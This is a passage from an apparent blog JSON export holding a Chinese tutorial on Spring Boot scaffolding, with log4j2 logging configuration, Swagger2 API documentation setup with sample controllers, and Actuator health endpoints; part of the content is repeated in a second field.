&lt;!--appender主要作用就是：①控制打印日志的地方、②打印日志的输出格式--&gt;</span><br><span class=\"line\">    &lt;Appenders&gt;</span><br><span class=\"line\">        &lt;!-- 输出控制台日志的配置 --&gt;</span><br><span class=\"line\">        &lt;Console name=&quot;console&quot; target=&quot;SYSTEM_OUT&quot;&gt;</span><br><span class=\"line\">            &lt;!--控制台只输出level及以上级别的信息（onMatch），其他的直接拒绝（onMismatch）--&gt;</span><br><span class=\"line\">            &lt;ThresholdFilter level=&quot;info&quot; onMatch=&quot;ACCEPT&quot; onMismatch=&quot;DENY&quot;/&gt;</span><br><span class=\"line\">            &lt;!-- 输出日志的格式 --&gt;</span><br><span class=\"line\">            &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;/&gt;</span><br><span class=\"line\">        &lt;/Console&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;!-- 打印出所有的信息，每次大小超过size，则这size大小的日志会自动存入按年份-月份建立的文件夹下面并进行压缩，作为存档 --&gt;</span><br><span class=\"line\">        &lt;RollingRandomAccessFile name=&quot;infoFile&quot; fileName=&quot;$&#123;fileName&#125;/log-info.log&quot; immediateFlush=&quot;false&quot;</span><br><span class=\"line\">                                 filePattern=&quot;$&#123;fileGz&#125;/$$&#123;date:yyyy-MM&#125;/app-%d&#123;MM-dd-yyyy&#125;-%i.log-info.gz&quot;&gt;</span><br><span class=\"line\">            &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd &apos;at&apos; HH:mm:ss z&#125; [%t] %-5level %logger&#123;36&#125; %L %M - %msg%xEx%n&quot; /&gt;</span><br><span class=\"line\">            &lt;Policies&gt;</span><br><span class=\"line\">                &lt;TimeBasedTriggeringPolicy interval=&quot;6&quot; modulate=&quot;true&quot; /&gt;</span><br><span class=\"line\">                &lt;SizeBasedTriggeringPolicy size=&quot;100 MB&quot;/&gt;</span><br><span class=\"line\">            &lt;/Policies&gt;</span><br><span class=\"line\">            &lt;Filters&gt;</span><br><span class=\"line\">                &lt;!-- 只记录info和warn级别信息 --&gt;</span><br><span class=\"line\">                &lt;ThresholdFilter level=&quot;error&quot; onMatch=&quot;DENY&quot; onMismatch=&quot;NEUTRAL&quot;/&gt;</span><br><span class=\"line\">                &lt;ThresholdFilter level=&quot;info&quot; onMatch=&quot;ACCEPT&quot; onMismatch=&quot;DENY&quot; /&gt;</span><br><span class=\"line\">            &lt;/Filters&gt;</span><br><span class=\"line\">            &lt;!-- 指定每天的最大压缩包个数，默认7个，超过了会覆盖之前的 --&gt;</span><br><span class=\"line\">            &lt;DefaultRolloverStrategy max=&quot;50&quot;/&gt;</span><br><span class=\"line\">        &lt;/RollingRandomAccessFile&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;!-- 存储所有error信息 --&gt;</span><br><span class=\"line\">        &lt;RollingRandomAccessFile name=&quot;errorFile&quot; fileName=&quot;$&#123;fileName&#125;/log-error.log&quot; immediateFlush=&quot;false&quot;</span><br><span class=\"line\">                                 filePattern=&quot;$&#123;fileGz&#125;/$$&#123;date:yyyy-MM&#125;/app-%d&#123;MM-dd-yyyy&#125;-%i.log-error.gz&quot;&gt;</span><br><span class=\"line\">            &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd &apos;at&apos; HH:mm:ss z&#125; [%t] %-5level %logger&#123;36&#125; %L %M - %msg%xEx%n&quot; /&gt;</span><br><span class=\"line\">            &lt;Policies&gt;</span><br><span class=\"line\">                &lt;TimeBasedTriggeringPolicy interval=&quot;6&quot; modulate=&quot;true&quot; /&gt;</span><br><span class=\"line\">                &lt;SizeBasedTriggeringPolicy size=&quot;100 MB&quot;/&gt;</span><br><span class=\"line\">            &lt;/Policies&gt;</span><br><span class=\"line\">            &lt;Filters&gt;</span><br><span class=\"line\">                &lt;!-- 只记录error级别信息 --&gt;</span><br><span class=\"line\">                &lt;ThresholdFilter level=&quot;error&quot; onMatch=&quot;ACCEPT&quot; onMismatch=&quot;DENY&quot; /&gt;</span><br><span class=\"line\">            &lt;/Filters&gt;</span><br><span class=\"line\">            &lt;!-- 指定每天的最大压缩包个数，默认7个，超过了会覆盖之前的 --&gt;</span><br><span class=\"line\">            &lt;DefaultRolloverStrategy max=&quot;50&quot;/&gt;</span><br><span class=\"line\">        &lt;/RollingRandomAccessFile&gt;</span><br><span class=\"line\">    &lt;/Appenders&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;!-- 全局配置，默认所有的Logger都继承此配置 --&gt;</span><br><span class=\"line\">    &lt;Loggers&gt;</span><br><span class=\"line\">        &lt;!-- AsyncRoot - 异步记录日志 - 需要LMAX Disruptor的支持 --&gt;</span><br><span class=\"line\">        &lt;AsyncRoot level=&quot;info&quot; additivity=&quot;false&quot;&gt;</span><br><span class=\"line\">            &lt;AppenderRef ref=&quot;console&quot;/&gt;</span><br><span class=\"line\">            &lt;AppenderRef ref=&quot;infoFile&quot;/&gt;</span><br><span class=\"line\">            &lt;AppenderRef ref=&quot;errorFile&quot;/&gt;</span><br><span class=\"line\">        &lt;/AsyncRoot&gt;</span><br><span class=\"line\">    &lt;/Loggers&gt;</span><br><span class=\"line\">&lt;/Configuration&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Controller</span><br><span class=\"line\">public class TestController &#123;</span><br><span class=\"line\">    Logger logger = LogManager.getLogger(TestController.class);</span><br><span class=\"line\"></span><br><span class=\"line\">    @RequestMapping(value = &quot;test&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">    @ResponseBody</span><br><span class=\"line\">    public String test()&#123;</span><br><span class=\"line\">        logger.debug(&quot;test debug&quot;);</span><br><span class=\"line\">        logger.info(&quot;test info&quot;);</span><br><span class=\"line\">        logger.warn(&quot;test warn&quot;);</span><br><span class=\"line\">        logger.error(&quot;test error&quot;);</span><br><span class=\"line\">        logger.fatal(&quot;test fatal&quot;);</span><br><span class=\"line\">        return &quot;ok&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"2-Restful-API\"><a href=\"#2-Restful-API\" class=\"headerlink\" title=\"2.Restful API\"></a>2.Restful API</h4><p>使用swagger2</p>\n<ul>\n<li><p>依赖</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  &lt;!-- Swagger依赖 注意版本一致--&gt;</span><br><span class=\"line\">  &lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;2.2.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;2.2.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>配置类</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Configuration</span><br><span class=\"line\">@EnableSwagger2</span><br><span class=\"line\">public class Swagger2 &#123;</span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * apis()设置监控路径</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @Bean</span><br><span class=\"line\">    public Docket createRestApi() &#123;</span><br><span class=\"line\">        return new Docket(DocumentationType.SWAGGER_2)</span><br><span class=\"line\">                .apiInfo(apiInfo())</span><br><span class=\"line\">                .select()</span><br><span class=\"line\">                .apis(RequestHandlerSelectors.basePackage(&quot;com.example.springboottemplate.controllers&quot;))</span><br><span class=\"line\">                .paths(PathSelectors.any())</span><br><span class=\"line\">                .build();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 创建api基本信息，会展示在文档页面</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private ApiInfo apiInfo() &#123;</span><br><span class=\"line\">        return new ApiInfoBuilder()</span><br><span class=\"line\">                .title(&quot;Swagger2 demo&quot;)</span><br><span class=\"line\">                .description(&quot;Spring Boot中使用Swagger2构建RESTful APIs&quot;)</span><br><span class=\"line\">                .version(&quot;1.0&quot;)</span><br><span class=\"line\">                .build();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用<br><br><strong>注意：要使用@RequestParam()接收参数，需要paramType=”query”</strong><br><br>具体参数信息:<a href=\"https://amphilicitezh.github.io/2017/12/04/swaggerui-introduce/\" target=\"_blank\" rel=\"noopener\">https://amphilicitezh.github.io/2017/12/04/swaggerui-introduce/</a></p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Api(value = &quot;测试接口类TestController&quot;)</span><br><span class=\"line\">@Controller</span><br><span class=\"line\">@ResponseBody</span><br><span class=\"line\">public class TestController &#123;</span><br><span class=\"line\">    Logger logger = LogManager.getLogger(TestController.class);</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试get不带参数&quot;,notes = &quot;测试get不带参数&quot;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;test1&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">    public String test()&#123;</span><br><span class=\"line\">        logger.debug(&quot;test debug&quot;);</span><br><span class=\"line\">        logger.info(&quot;test info&quot;);</span><br><span class=\"line\">        logger.warn(&quot;test warn&quot;);</span><br><span class=\"line\">        logger.error(&quot;test error&quot;);</span><br><span class=\"line\">        logger.fatal(&quot;test fatal&quot;);</span><br><span class=\"line\">        return &quot;ok&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试get带参数&quot;,notes = &quot;测试get带参数&quot;)</span><br><span class=\"line\">    @ApiImplicitParam(name = &quot;username&quot;, value = &quot;用户名&quot;, required = true, dataType = &quot;String&quot;,paramType = &quot;query&quot;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;test2&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">    public String test2(@RequestParam(&quot;username&quot;) String username)&#123;</span><br><span class=\"line\">        if(!username.equals(&quot;&quot;) &amp;&amp; username != null)&#123;</span><br><span class=\"line\">            System.out.println(username);</span><br><span class=\"line\">            return username;</span><br><span class=\"line\">        &#125;else &#123;</span><br><span class=\"line\">            return &quot;null&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试post带实体参数&quot;, notes = &quot;测试post带实体参数&quot;)</span><br><span class=\"line\">    @ApiImplicitParam(name = &quot;user&quot;,value = &quot;用户名&quot;,required = true, dataType = &quot;Map&lt;String,Object&gt;&quot;)</span><br><span class=\"line\">    @ApiResponses(&#123;</span><br><span class=\"line\">           @ApiResponse(code = 400, message = &quot;请求参数没填好,注意为json&quot;),</span><br><span class=\"line\">           @ApiResponse(code = 404, message = &quot;请求路径没有或页面跳转路径不对&quot;),</span><br><span class=\"line\">           @ApiResponse(code = 500, message = &quot;服务器端发生错误&quot;)</span><br><span class=\"line\">   &#125;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;/test3&quot;, method = RequestMethod.POST)</span><br><span class=\"line\">    public String test3(@RequestBody Map&lt;String,Object&gt; user)&#123;</span><br><span class=\"line\">        System.out.println(user.get(&quot;username&quot;).toString());</span><br><span class=\"line\">        System.out.println(user.get(&quot;password&quot;).toString());</span><br><span class=\"line\">        return &quot;ok&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试post参数为String&quot;, notes = &quot;测试post参数为String&quot;)</span><br><span class=\"line\">    @ApiImplicitParams(&#123;</span><br><span class=\"line\">            @ApiImplicitParam(name = &quot;username&quot;, value = &quot;用户名&quot;, required = true, paramType = &quot;query&quot;, dataType = &quot;String&quot;),</span><br><span class=\"line\">            @ApiImplicitParam(name = &quot;password&quot;, value = &quot;密码&quot;, required = true, paramType = &quot;query&quot;, dataType = &quot;String&quot;)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;/test4&quot;, method = RequestMethod.POST)</span><br><span class=\"line\">    public String test4(@RequestParam(&quot;username&quot;) String username,</span><br><span class=\"line\">                        @RequestParam(&quot;password&quot;) String passwprd)&#123;</span><br><span class=\"line\">       return username + &quot;:&quot; + passwprd;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ApiOperation(value = &quot;测试restful类型接口&quot;, notes = &quot;测试restful类型接口&quot;)</span><br><span class=\"line\">    @RequestMapping(value = &quot;/test5/&#123;name&#125;&quot;, method = RequestMethod.GET)</span><br><span class=\"line\">    @ApiImplicitParam(name = &quot;username&quot;, value = &quot;用户名&quot;, required = true, paramType = &quot;query&quot;, dataType = &quot;String&quot;)</span><br><span class=\"line\">    public String test5(@PathVariable(&quot;name&quot;) String name,</span><br><span class=\"line\">                        @RequestParam(&quot;username&quot;) String username)&#123;</span><br><span class=\"line\">        return name + &quot; : &quot; + username;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>访问:<a href=\"http://127.0.0.1:8080/swagger-ui.html\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/swagger-ui.html</a></p>\n<h4 id=\"3-Health\"><a href=\"#3-Health\" class=\"headerlink\" title=\"3.Health\"></a>3.Health</h4><p>这是2.0版本：<a href=\"https://blog.csdn.net/alinyua/article/details/80009435\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/alinyua/article/details/80009435</a><br><br>可以直观的看到自己CPU的利用率、内存的利用率、数据库连接是否正常等信息</p>\n<ul>\n<li><p>依赖</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;!--&lt;version&gt;2.1.0.RELEASE&lt;/version&gt;--&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Springboot2版本需要在application.properties加入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">management.endpoints.web.exposure.include=*</span><br><span class=\"line\">#显示所有健康状态，需要加配置</span><br><span class=\"line\">management.endpoint.health.show-details=always</span><br></pre></td></tr></table></figure>\n<p>内置EndPoints：</p>\n<blockquote>\n<p><a href=\"http://127.0.0.1:8080/actuator\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator</a><br><br><a href=\"http://127.0.0.1:8080/actuator/health\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator/health</a><br><br><a href=\"http://127.0.0.1:8080/actuator/info\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator/info</a><br><br><a href=\"http://127.0.0.1:8080/actuator/beans\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator/beans</a><br><br><a href=\"http://127.0.0.1:8080/actuator/httptrace\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:8080/actuator/httptrace</a></p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"4-Eureka\"><a href=\"#4-Eureka\" class=\"headerlink\" title=\"4.Eureka\"></a>4.Eureka</h4>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"springboot架子搭建\"><a href=\"#springboot架子搭建\" class=\"headerlink\" title=\"springboot架子搭建\"></a>springboot架子搭建</h3><h4 id=\"1-日志\"><a href=\"#1-日志\" class=\"headerlink\" title=\"1.日志\"></a>1.日志</h4><h5 id=\"（1）log4j2\"><a href=\"#（1）log4j2\" class=\"headerlink\" title=\"（1）log4j2\"></a>（1）log4j2</h5><ul>\n<li><p>依赖</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!--引入log4j2--&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;!--log4j2依赖于disruptor--&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;com.lmax&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;disruptor&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;3.4.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>配置文件log4j2.xml<br>log4j2默认会在classpath目录下寻找log4j.json、log4j.jsn、log4j2.xml等名称的文件，如果都没有找到，则会按默认配置输出，也就是输出到控制台</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!-- Configuration后面的status，这个用于设置log4j2自身内部的信息输出，可以不设置，当设置成trace时，</span><br><span class=\"line\">    你会看到log4j2内部各种详细输出。可以设置成OFF(关闭)或Error(只输出错误信息)</span><br><span class=\"line\">  --&gt;</span><br><span class=\"line\">&lt;Configuration status=&quot;INFO&quot;&gt;</span><br><span class=\"line\">    &lt;!-- 日志文件目录和压缩文件目录配置 --&gt;</span><br><span class=\"line\">    &lt;Properties&gt;</span><br><span class=\"line\">        &lt;Property name=&quot;fileName&quot;&gt;C:\\\\Users\\\\xiong\\\\Desktop\\\\log\\\\log4j2&lt;/Property&gt;</span><br><span class=\"line\">        &lt;Property name=&quot;fileGz&quot;&gt;C:\\\\Users\\\\xiong\\\\Desktop\\\\log\\\\log4j2\\\\7z&lt;/Property&gt;</span><br><span class=\"line\">    &lt;/Properties&gt;</span><br><span class=\"line\">    &lt;!--appender主要作用就是：①控制打印日志的地方、②打印日志的输出格式--&gt;</span><br><span class=\"line\">    &lt;Appenders&gt;</span><br><span class=\"line\">        &lt;!-- 输出控制台日志的配置 --&gt;</span><br><span class=\"line\">        &lt;Console name=&quot;console&quot; target=&quot;SYSTEM_OUT&quot;&gt;</span><br><span class=\"line\">            &lt;!--控制台只输出level及以上级别的信息（onMatch），其他的直接拒绝（onMismatch）--&gt;</span><br><span class=\"line\">            &lt;ThresholdFilter level=&quot;info&quot; onMatch=&quot;ACCEPT&quot; onMismatch=&quot;DENY&quot;/&gt;</span><br><span class=\"line\">            &lt;!-- 输出日志的格式 --&gt;</span><br><span class=\"line\">            &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;/&gt;</span><br><span class=\"line\">        &lt;/Console&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;!-- 打印出所有的信息，每次大小超过size，则这size大小的日志会自动存入按年份-月份建立的文件夹下面并进行压缩，作为存档 --&gt;</span><br><span class=\"line\">        &lt;RollingRandomAccessFile name=&quot;infoFile&quot; fileName=&quot;$&#123;fileName&#125;/log-info.log&quot; immediateFlush=&quot;false&quot;</span><br><span class=\"line\">                                 filePattern=&quot;$&#123;fileGz&#125;/$$&#123;date:yyyy-MM&#125;/app-%d&#123;MM-dd-yyyy&#125;-%i.log-info.gz&quot;&gt;</span><br><span class=\"line\">            &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd &apos;at&apos; HH:mm:ss z&#125; [%t] %-5level %logger&#123;36&#125; %L %M - %msg%xEx%n&quot; /&gt;</span><br><span class=\"line\">            &lt;Policies&gt;</span><br><span class=\"line\">                &lt;TimeBasedTriggeringPolicy interval=&quot;6&quot; modulate=&quot;true&quot; /&gt;</span><br><span class=\"line\">                &lt;SizeBasedTriggeringPolicy size=&quot;100 MB&quot;/&gt;</span><br><span class=\"line\">            &lt;/Policies&gt;</span><br><span class=\"line\">            &lt;Filters&gt;</span><br><span class=\"line\">                &lt;!-- 只记录info和warn级别信息 --&gt;</span><br><span class=\"line\">                &lt;ThresholdFilter level=&quot;error&quot; onMatch=&quot;DENY&quot; onMismatch=&quot;NEUTRAL&quot;/&gt;</span><br><span class=\"line\">                &lt;ThresholdFilter level=&quot;info&quot; onMatch=&quot;ACCEPT&quot; onMismatch=&quot;DENY&quot; /&gt;</span><br><span class=\"line\">            &lt;/Filters&gt;</span><br><span class=\"line\">            &lt;!-- 指定每天的最大压缩包个数，默认7个，超过了会覆盖之前的 --&gt;</span><br><span class=\"line\">            &lt;DefaultRolloverStrategy max=&quot;50&quot;/&gt;</span><br><span class=\"line\">        &lt;/RollingRandomAccessFile&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;!-- 存储所有error信息 --&gt;</span><br><span class=\"line\">        &lt;RollingRandomAccessFile name=&quot;errorFile&quot; fileName=&quot;$&#123;fileName&#125;/log-error.log&quot; immediateFlush=&quot;false&quot;</span><br><span class=\"line\">                                 filePattern=&quot;$&#123;fileGz&#125;/$$&#123;date:yyyy-MM&#125;/app-%d&#123;MM-dd-yyyy&#125;-%i.log-error.gz&quot;&gt;</span><br><span class=\"line\">            &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd &apos;at&apos; HH:mm:ss z&#125; [%t] %-5level %logger&#123;36&#125; %L %M - %msg%xEx%n&quot; /&gt;</span><br><span class=\"line\">            &lt;Policies&gt;</span><br><span class=\"line\">                &lt;TimeBasedTriggeringPolicy interval=&quot;6&quot; modulate=&quot;true&quot; /&gt;</span><br><span class=\"line\">                &lt;SizeBasedTriggeringPolicy size=&quot;100 MB&quot;/&gt;</span><br><span class=\"line\">            &lt;/Policies&gt;</span><br><span class=\"line\">            &lt;Filters&gt;</span><br><span class=\"line\">                &lt;!-- 只记录error级别信息 --&gt;</span><br><span class=\"line\">                &lt;ThresholdFilter level=&quot;error&quot; onMatch=&quot;ACCEPT&quot; onMismatch=&quot;DENY&quot; /&gt;</span><br><span class=\"line\">            &lt;/Filters&gt;</span><br><span class=\"line\">            &lt;!-- 指定每天的最大压缩包个数，默认7个，超过了会覆盖之前的 --&gt;</span><br><span class=\"line\">            &lt;DefaultRolloverStrategy max=&quot;50&quot;/&gt;</span><br><span class=\"line\">        &lt;/RollingRandomAccessFile&gt;</span><br><span class=\"line\">    &lt;/Appenders&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;!-- 全局配置，默认所有的Logger都继承此配置 --&gt;</span><br><span class=\"line\">    &lt;Loggers&gt;</span><br><span class=\"line\">        &lt;!-- AsyncRoot - 异步记录日志 - 需要LMAX Disruptor的支持 --&gt;</span><br><span class=\"line\">        &lt;AsyncRoot level=&quot;info&quot; additivity=&quot;false&quot;&gt;</span><br><span class=\"line\">            &lt;AppenderRef ref=&quot;console&quot;/&gt;</span><br><span class=\"line\">            &lt;AppenderRef ref=&quot;infoFile&quot;/&gt;</span><br><span class=\"line\">            &lt;AppenderRef ref=&quot;errorFile&quot;/&gt;</span><br><span class=\"line\">        &lt;/AsyncRoot&gt;</span><br><span class=\"line\">    &lt;/Loggers&gt;</span><br><span 